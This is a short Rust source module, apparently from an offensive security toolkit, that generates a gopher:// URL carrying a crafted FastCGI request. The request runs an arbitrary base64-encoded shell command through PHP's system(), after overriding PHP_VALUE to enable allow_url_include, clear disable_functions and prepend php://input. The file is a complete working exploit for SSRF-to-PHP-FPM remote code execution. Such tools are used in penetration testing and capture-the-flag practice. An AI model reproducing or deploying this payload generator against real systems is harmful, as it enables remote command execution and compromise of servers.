//! FastCGI exploit via Gopher protocol

use anyhow::Result;
use base64::{engine::general_purpose::STANDARD, Engine};

use super::utils::replace_fastcgi_payload;
use crate::cmds::fastcgi::FastCGIRecord;

/// Generate Gopher FastCGI exploit payload
pub fn gopher_fastcgi_exp(addr: &str, cmd: &str, filename: &str) -> Result<String> {
    let cmd_encoded = STANDARD.encode(cmd.as_bytes());
    let body = format!("<?php system(base64_decode('{cmd_encoded}'));?>");

    let env = vec![
        ("SERVER_SOFTWARE", "virzz - fcgiclient".to_string()),
        ("REMOTE_ADDR", "127.0.0.1".to_string()),
        ("SERVER_PROTOCOL", "HTTP/1.1".to_string()),
        ("CONTENT_LENGTH", body.len().to_string()),
        ("REQUEST_METHOD", "POST".to_string()),
        ("SCRIPT_FILENAME", filename.to_string()),
        (
            "PHP_VALUE",
            "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input"
                .to_string(),
        ),
        ("DOCUMENT_ROOT", "/".to_string()),
    ];

    let record = FastCGIRecord::new(env, body.as_bytes(), 1);
    let data = record.to_bytes();
    let encoded = urlencoding::encode_binary(&data);
    let payload = replace_fastcgi_payload(&encoded);

    Ok(format!("gopher://{addr}/_{payload}"))
}
